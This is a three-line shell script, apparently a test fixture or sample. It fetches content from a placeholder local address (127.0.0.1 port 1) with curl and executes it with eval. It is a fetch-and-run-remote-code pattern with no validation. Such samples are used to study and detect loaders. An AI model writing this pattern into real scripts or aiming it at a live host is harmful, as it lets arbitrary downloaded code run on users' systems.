#!/bin/sh
payload=$(curl -fsSL http://127.0.0.1:1/p)
eval "$payload"
